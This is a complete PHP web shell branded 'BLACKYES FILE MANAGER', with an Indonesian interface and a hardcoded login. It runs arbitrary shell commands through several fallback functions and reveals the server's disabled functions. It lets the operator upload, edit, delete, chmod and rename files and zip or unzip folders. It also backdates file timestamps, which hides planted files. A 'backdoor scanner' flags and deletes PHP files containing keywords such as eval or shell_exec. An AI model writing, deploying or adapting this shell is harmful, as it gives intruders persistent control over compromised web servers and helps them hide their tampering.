<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

$USERNAME = 'BLACKYES';
$HASHED_PASSWORD = '$2a$12$oH2jAVHIvkZ1acoW9c4iRePK9w1fmn6kv3KOJApR8jSuBa.k2Vd1O';

if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['login'])) {
        if ($_POST['username'] === $USERNAME && password_verify($_POST['password'], $HASHED_PASSWORD)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah.";
        }
    }

    echo '<!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>Login - BLACKYES</title>
        <style>
            @import url("https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap");
            body {
                background: radial-gradient(circle at center, #000000, #0f0f0f);
                color: rgba(255, 0, 0, 1);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: "Share Tech Mono", monospace;
            }
            .login-box {
                background: #111;
                border: 2px solid rgba(255, 0, 0, 1);
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 0 20px rgba(255, 0, 0, 1);
                text-align: center;
                width: 300px;
            }
            .login-box img {
                max-width: 100px;
                border-radius: 50%;
                margin-bottom: 20px;
                box-shadow: 0 0 10px rgba(255, 0, 0, 1);
            }
            input, button {
                margin: 10px 0;
                padding: 10px;
                width: 100%;
                border: none;
                border-radius: 5px;
                background: #222;
                color: rgba(255, 0, 0, 1);
                font-size: 14px;
            }
            button {
                background: rgba(255, 0, 0, 1);
                color: #000;
                font-weight: bold;
                cursor: pointer;
            }
            h2 {
                margin-bottom: 10px;
            }
            .error {
                color: red;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <form method="POST" class="login-box">
            <img src="https://botstrap.cc/image/BLACKYES.png" alt="BLACKYES">
            <h2>BLACKYES</h2>
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="login">MASUK</button>
            ' . (isset($error) ? "<div class='error'>$error</div>" : "") . '
        </form>
    </body>
    </html>';
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function x($string) {
    return htmlspecialchars($string ?? '', ENT_QUOTES, 'UTF-8');
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    else return $bytes . ' B';
}

function permColor($path) {
    if (is_writable($path)) return 'style="color:#0f0"';
    elseif (is_readable($path)) return 'style="color:#fff"';
    else return 'style="color:#f00"';
}

function runShellCommand($command) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec($command);
    } elseif (function_exists('exec')) {
        exec($command, $lines);
        $output = implode("\n", $lines);
    } elseif (function_exists('system')) {
        ob_start();
        system($command);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command);
        $output = ob_get_clean();
    } else {
        return false;
    }
    return $output;
}

$isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

$inputPath = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();

$currentPath = $isWindows
    ? str_replace('/', DIRECTORY_SEPARATOR, $inputPath)
    : str_replace('\\', DIRECTORY_SEPARATOR, $inputPath);

if (!is_dir($currentPath)) {
    die("Direktori tidak valid: <code>$currentPath</code>");
}

if (!is_dir($currentPath)) die("Direktori tidak valid.");

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'unzip' && !empty($_POST['zip_path'])) {
        $zipPath = $_POST['zip_path'];
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === true) {
            $zip->extractTo($currentPath);
            $zip->close();
            echo json_encode(['status' => 'success', 'message' => 'Berhasil extract file ZIP.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Gagal membuka file ZIP.']);
        }
        exit;
    }

    if ($_POST['action'] === 'zip' && !empty($_POST['folder_to_zip'])) {
        $folderToZip = $_POST['folder_to_zip'];
        $zipName = basename($folderToZip) . ".zip";
        $zipPath = $currentPath . DIRECTORY_SEPARATOR . $zipName;

        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
            $folderRealPath = realpath($folderToZip);
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($folderRealPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($files as $file) {
                $filePath = realpath($file);
                $relativePath = substr($filePath, strlen($folderRealPath) + 1);
                if ($file->isDir()) {
                    $zip->addEmptyDir($relativePath);
                } else {
                    $zip->addFile($filePath, $relativePath);
                }
            }

            $zip->close();
            echo json_encode(['status' => 'success', 'message' => "Folder berhasil dijadikan ZIP: $zipName"]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Gagal membuat file ZIP.']);
        }
        exit;
    }
}

$allItems = scandir($currentPath);
$allFiles = [];
$allFolders = [];
foreach ($allItems as $item) {
    if ($item === '.' || $item === '..') continue;
    $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
    if (is_dir($itemPath)) $allFolders[] = $item;
    if (is_file($itemPath) && pathinfo($item, PATHINFO_EXTENSION) === 'zip') $allFiles[] = $item;
}

if (isset($_POST['run_command'])) {
    $command = $_POST['command'];
    $output = runShellCommand($command);
    if ($output !== false) {
        if (!empty($output)) {
            $message = "<pre style='background:#000;color:#0f0;padding:10px;'>" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "</pre>";
            $messageType = "success";
        } else {
            $message = "<div class='alert error'>Perintah tidak bisa dijalankan atau tidak menghasilkan output.</div>";
            $messageType = "error";
        }
    } else {
        $message = "Semua fungsi eksekusi shell tidak tersedia di server.";
        $messageType = "error";
    }
}

if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
    $newFile = rtrim($currentPath, '/') . '/' . basename($_POST['file_name']);
    if (file_exists($newFile)) {
        $message = "File sudah ada.";
        $messageType = "error";
    } else {
        if (file_put_contents($newFile, '') !== false) {
            $message = "File berhasil dibuat.";
            $messageType = "success";
        } else {
            $message = "Gagal membuat file.";
            $messageType = "error";
        }
    }
}

if (isset($_POST['edit'])) {
    $path = $_POST['edit_path'];
    if (is_file($path)) {
        $content = htmlspecialchars(file_get_contents($path));
        echo "<form method='POST' style='padding:20px;background:#222;color:#fff;'>
            <input type='hidden' name='edit_path' value='" . htmlspecialchars($path) . "'>
            <textarea name='new_content' style='width:100%;height:300px;background:#000;color:#0f0;'>$content</textarea><br>
            <button name='save_edit' style='padding:10px;background:#0f0;color:#000;'>Simpan</button>
        </form>";
        exit;
    }
}

if (isset($_POST['change_perm']) && !empty($_POST['perm_path']) && !empty($_POST['permissions'])) {
    $permPath = $_POST['perm_path'];
    $perm = $_POST['permissions'];

    if (@chmod($permPath, octdec($perm))) {
        $message = "Permission berhasil diubah.";
        $messageType = "success";
    } else {
        $message = "Gagal mengubah permission.";
        $messageType = "error";
    }
}

if (isset($_POST['rename']) && !empty($_POST['rename_path']) && !empty($_POST['new_name'])) {
    $oldPath = $_POST['rename_path'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (file_exists($newPath)) {
        $message = "Nama baru sudah digunakan.";
        $messageType = "error";
    } else {
        if (rename($oldPath, $newPath)) {
            $message = "Berhasil mengganti nama.";
            $messageType = "success";
        } else {
            $message = "Gagal mengganti nama.";
            $messageType = "error";
        }
    }
}

if (isset($_POST['save_edit'])) {
    if (file_put_contents($_POST['edit_path'], $_POST['new_content']) !== false) {
        $message = "File berhasil disimpan.";
        $messageType = "success";
    } else {
        $message = "Gagal menyimpan file.";
        $messageType = "error";
    }
}

if (isset($_POST['upload']) && isset($_FILES['uploaded_file'])) {
    $targetPath = rtrim($currentPath, '/') . '/' . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetPath)) {
        $message = "File berhasil diupload.";
        $messageType = "success";
    } else {
        $message = "Gagal mengupload file.";
        $messageType = "error";
    }
}

if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $newFolder = rtrim($currentPath, '/') . '/' . basename($_POST['folder_name']);
    if (file_exists($newFolder)) {
        $message = "Folder sudah ada.";
        $messageType = "error";
    } elseif (mkdir($newFolder, 0755)) {
        $message = "Folder berhasil dibuat.";
        $messageType = "success";
    } else {
        $message = "Gagal membuat folder.";
        $messageType = "error";
    }
}

if (isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (is_file($deletePath)) {
        if (unlink($deletePath)) {
            $message = "File berhasil dihapus.";
            $messageType = "success";
        } else {
            $message = "Gagal menghapus file.";
            $messageType = "error";
        }
    } elseif (is_dir($deletePath)) {
        if (rmdir($deletePath)) {
            $message = "Folder berhasil dihapus.";
            $messageType = "success";
        } else {
            $message = "Gagal menghapus folder (pastikan kosong).";
            $messageType = "error";
        }
    } else {
        $message = "Path tidak ditemukan.";
        $messageType = "error";
    }
}

if (isset($_POST['change_time']) && !empty($_POST['new_time'])) {
    $timePath = $_POST['time_path'];
    $newTime = strtotime($_POST['new_time']);
    if ($newTime !== false && touch($timePath, $newTime, $newTime)) {
        $message = "Tanggal file berhasil diubah.";
        $messageType = "success";
    } else {
        $message = "Format tanggal tidak valid atau gagal mengubah tanggal.";
        $messageType = "error";
    }
}

if (isset($_POST['scan_backdoor'])) {
    $scanPath = $_POST['scan_path'] ?? $currentPath;
    if (!is_dir($scanPath)) {
        echo "<div class='alert error'>❌ Direktori tidak valid.</div>";
    } else {
        $danger_keywords = [
            'tinggi' => ['eval(', 'shell_exec(', 'exec(', 'passthru(', 'system(', 'base64_decode(', 'gzinflate('],
            'biasa'  => ['file_put_contents(', 'file_get_contents(', 'move_uploaded_file(']
        ];

        $suspectFiles = [];

        function scanBackdoorDeep($dir, &$results, $danger_keywords) {
            $items = scandir($dir);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $path = $dir . DIRECTORY_SEPARATOR . $item;

                if (basename($path) === 'shell-found.txt') continue;

                if (is_dir($path)) {
                    scanBackdoorDeep($path, $results, $danger_keywords);
                } else {
                    $ext = pathinfo($path, PATHINFO_EXTENSION);
                    if (in_array(strtolower($ext), ['php', 'phtml', 'inc'])) {
                        $content = @file_get_contents($path);
                        if (!$content) continue;
                        $content = strtolower($content);

                        $detected = [];
                        foreach ($danger_keywords as $level => $keywords) {
                            foreach ($keywords as $kw) {
                                if (strpos($content, strtolower($kw)) !== false) {
                                    $detected[] = $kw;
                                }
                            }
                            if (!empty($detected)) {
                                $results[] = [
                                    'file' => $path,
                                    'level' => $level,
                                    'hits' => $detected
                                ];
                                
                                $logLine = "$path | Level: " . strtoupper($level) . " | Found: " . implode(', ', $detected) . "\n";
                                file_put_contents("shell-found.txt", $logLine, FILE_APPEND);
                                break;
                            }
                        }
                    }
                }
            }
        }

        scanBackdoorDeep($scanPath, $suspectFiles, $danger_keywords);

        if (!empty($suspectFiles)) {
            echo "<h3>🛑 Ditemukan File Mencurigakan di <span style='color:yellow'>" . x($scanPath) . "</span>:</h3><ul>";
            foreach ($suspectFiles as $s) {
                $file = $s['file'];
                $level = strtoupper($s['level']);
                $color = $level === 'TINGGI' ? '#ff0000' : '#ffaa00';
                $hits = implode(', ', $s['hits']);
                echo "<li>
                    <span style='color:yellow'>" . x($file) . "</span> 
                    <span style='background:$color;padding:2px 6px;border-radius:4px;color:#000;margin-left:5px;'>$level</span>
                    <span style='font-size:smaller;color:#888;'>($hits)</span>
                    <form method='POST' style='display:inline'>
                        <input type='hidden' name='delete_path' value='" . x($file) . "'>
                        <button name='delete' onclick='return confirm(\"Hapus file ini?\")'>[Hapus]</button>
                    </form>
                </li>";

            }
            echo "</ul>";
        } else {
            echo "<div class='alert success'>✅ Tidak ditemukan file mencurigakan.</div>";
        }
    }
}

?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap");body {
            font-family: 'Share Tech Mono', monospace;
            background: linear-gradient(145deg, #000000, #0a0a0a);
            color: #0f0;
            padding: 20px;
        }
        h2, h3, h1 {
            color: #0f0;
            text-shadow: 0 0 10px rgba(255, 0, 0, 1);
        }
        a {
            color: #00ff00;
            text-decoration: none;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background: #111;
            box-shadow: 0 0 10px rgba(255, 0, 0, 1);
        }
        th, td {
            border: 1px solid #0f033;
            padding: 8px;
            text-align: left;
        }
        th {
            background: #000;
            color: rgba(255, 0, 0, 1);
        }
        input[type="text"], input[type="file"], select {
            padding: 6px;
            margin: 5px;
            background: #000;
            color: rgba(255, 0, 0, 1);
            border: 1px solid rgba(255, 0, 0, 1);
            border-radius: 5px;
        }
        button {
            padding: 6px 10px;
            background: #0f0;
            color: #000;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            box-shadow: 0 0 5px #3b0e0eff;
        }
        button:hover {
            background: #00cc7eff;
        }
        form {
            display: inline-block;
        }
        .alert {
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
            font-weight: bold;
        }
        .success {
            background-color: #ff0000ff;
            color: #0f0;
            box-shadow: 0 0 10px #0f0;
        }
        .error {
            background-color: #440000;
            color: #f00;
            box-shadow: 0 0 10px #f00;
        }
    </style>
    <script>
        function confirmDelete() {
            return confirm('Yakin ingin menghapus file atau folder ini?');
        }
    </script>
</head>
<body>
<?php echo "<pre>Disable Functions: " . ini_get('disable_functions') . "</pre>"; ?>
<div style="text-align:center; margin-bottom: 20px;">
    <img src="https://botstrap.cc/image/BLACKYES.png" alt="BLACKYES" style="max-width:200px; border-radius:10px; box-shadow:0 0 15px #ff0000ff;">
    <h1 style="color:#0f0; font-family:monospace; text-shadow: 0 0 10px rgba(255, 0, 0, 1);">BLACKYES FILE MANAGER</h1>
</div>
<p><a href="?logout=1">Logout</a></p>

<?php if (!empty($message)): ?>
    <div class="alert <?php echo $messageType; ?>"><?php echo $message; ?></div>
<?php endif; ?>

<form method="POST" style="margin-bottom:20px;">
    <input type="text" name="command" placeholder="Perintah shell">
    <button name="run_command">Jalankan</button>
</form>

<p>Path saat ini:
<?php
$isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

$breadcrumbs = preg_split('/[\/\\\\]/', $currentPath); // support \ dan /
$pathSoFar = $isWindows ? '' : '/';

foreach ($breadcrumbs as $i => $crumb) {
    if ($crumb === '') continue;
    $pathSoFar .= ($i > 0 ? DIRECTORY_SEPARATOR : '') . $crumb;
    echo '<a href="?d=' . urlencode($pathSoFar) . '">' . x($crumb) . '</a>';
    if ($i < count($breadcrumbs) - 1) echo '/';
}
?>
</p>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="uploaded_file">
    <button type="submit" name="upload">Upload</button>
</form>
<form method="POST">
    <input type="text" name="folder_name" placeholder="Nama folder">
    <button type="submit" name="create_folder">Buat Folder</button>
</form>
<form method="POST">
    <input type="text" name="file_name" placeholder="Nama file (misal: file.txt)">
    <button type="submit" name="create_file">Buat File</button>
</form>

<form method="POST" style="margin-bottom:15px;">
    <input type="text" name="scan_path" placeholder="Path yang ingin discan" value="<?php echo x($currentPath); ?>" style="width: 400px;">
    <button type="submit" name="scan_backdoor">🔎 Scan Backdoor</button>
</form>

<table>
    <tr><th>Nama</th><th>Ukuran</th><th>Permission</th><th>Owner</th><th>Group</th><th>Tanggal</th><th>Aksi</th></tr>
    <?php
    $items = scandir($currentPath);
    $folders = [];
    $files = [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = rtrim($currentPath, '/') . '/' . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    $sortedItems = array_merge($folders, $files);

    foreach ($sortedItems as $item) {
        $fullPath = rtrim($currentPath, '/') . '/' . $item;
        $perm = substr(sprintf('%o', fileperms($fullPath)), -4);
        $stat = stat($fullPath);
        $owner = function_exists('posix_getpwuid') ? (posix_getpwuid($stat['uid']) ?? ['name' => $stat['uid']])['name'] : $stat['uid'];
        $group = function_exists('posix_getgrgid') ? (posix_getgrgid($stat['gid']) ?? ['name' => $stat['gid']])['name'] : $stat['gid'];
        $isDir = is_dir($fullPath);
        $date = date("Y-m-d H:i:s", filemtime($fullPath));

        echo '<tr>';
        echo '<td><a href="?d=' . urlencode($fullPath) . '">' . x($item) . '</a></td>';
        echo '<td>' . ($isDir ? 'Folder' : formatSize(filesize($fullPath))) . '</td>';
        echo '<td ' . permColor($fullPath) . '>' . $perm . '</td>';
        echo '<td>' . x($owner) . '</td>';
        echo '<td>' . x($group) . '</td>';
        echo '<td>' . $date . '</td>';
        echo '<td>';
        if (!$isDir) {
            echo '<form method="POST"><input type="hidden" name="edit_path" value="' . x($fullPath) . '"><button name="edit">Edit</button></form>';
        }
        echo '<form method="POST">
            <input type="hidden" name="rename_path" value="' . x($fullPath) . '">
            <input type="text" name="new_name" placeholder="Rename">
            <button name="rename">Rename</button>
        </form>
        <form method="POST">
            <input type="hidden" name="perm_path" value="' . x($fullPath) . '">
            <input type="text" name="permissions" placeholder="0755">
            <button name="change_perm">CHMOD</button>
        </form>
        <form method="POST">
            <input type="hidden" name="time_path" value="' . x($fullPath) . '">
            <input type="text" name="new_time" placeholder="2024-08-18 01:50:07">
            <button name="change_time">Ubah Tanggal</button>
        </form>
        <form method="POST" onsubmit="return confirmDelete();">
            <input type="hidden" name="delete_path" value="' . x($fullPath) . '">
            <button name="delete">Hapus</button>
        </form>';
        echo '</td>';
        echo '</tr>';
    }
    ?>
</table>

<div>
    <h3>🔓 Unzip File ZIP</h3>
    <select id="zip_path">
        <option value="">-- Pilih file ZIP --</option>
        <?php foreach ($allFiles as $zipFile): ?>
            <option value="<?php echo htmlspecialchars($currentPath . DIRECTORY_SEPARATOR . $zipFile); ?>"><?php echo htmlspecialchars($zipFile); ?></option>
        <?php endforeach; ?>
    </select>
    <button onclick="unzipFile()">Unzip</button>
</div>

<div>
    <h3>📦 ZIP Folder</h3>
    <select id="folder_to_zip">
        <option value="">-- Pilih folder --</option>
        <?php foreach ($allFolders as $folder): ?>
            <option value="<?php echo htmlspecialchars($currentPath . DIRECTORY_SEPARATOR . $folder); ?>"><?php echo htmlspecialchars($folder); ?></option>
        <?php endforeach; ?>
    </select>
    <button onclick="zipFolder()">ZIP</button>
</div>

<div id="result"></div>

<script>
function unzipFile() {
    const zipPath = document.getElementById('zip_path').value;
    if (!zipPath) return alert('Pilih file ZIP dulu!');
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams({action: 'unzip', zip_path: zipPath})
    })
    .then(res => res.json())
    .then(data => document.getElementById('result').innerHTML = data.message);
}

function zipFolder() {
    const folder = document.getElementById('folder_to_zip').value;
    if (!folder) return alert('Pilih folder dulu!');
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams({action: 'zip', folder_to_zip: folder})
    })
    .then(res => res.json())
    .then(data => document.getElementById('result').innerHTML = data.message);
}
</script>

<div id="scan-result"></div>
<button onclick="startAjaxScan()">🔎 Scan Backdoor (AJAX)</button>
<div id="progress" style="margin-top:10px;color:cyan;"></div>

<script>
let ajaxFolders = [];
let offset = 0;

function startAjaxScan() {
    const base = prompt("Scan dari folder mana?", "<?php echo x($currentPath); ?>");
    if (!base) return;

    document.getElementById('scan-result').innerHTML = '';
    document.getElementById('progress').innerText = "⏳ Mengumpulkan folder...";

    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams({ ajax_scan: 'collect', base })
    })
    .then(res => res.json())
    .then(data => {
        ajaxFolders = data.folders;
        offset = 0;
        ajaxScanStep(base);
    });
}

function ajaxScanStep(base) {
    if (offset >= ajaxFolders.length) {
        document.getElementById('progress').innerText = "✅ Scan selesai.";
        return;
    }

    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams({
            ajax_scan: 'step',
            path: ajaxFolders[offset]
        })
    })
    .then(res => res.json())
    .then(data => {
        document.getElementById('progress').innerText = `📂 ${offset + 1} / ${ajaxFolders.length}`;

        if (data.output.length > 0) {
            data.output.forEach(item => {
                const li = document.createElement('div');
                li.innerHTML = `<b style="color:yellow">${item.file}</b> 
                <span style="background:${item.level === 'TINGGI' ? 'red' : 'orange'};color:#000;padding:2px 5px;margin-left:5px;border-radius:3px">${item.level}</span>
                <span style="font-size:smaller;color:#ccc;">(${item.match})</span>`;
                document.getElementById('scan-result').appendChild(li);
            });
        }

        offset++;
        setTimeout(() => ajaxScanStep(base), 200);
    });
}
</script>

</body>
</html>
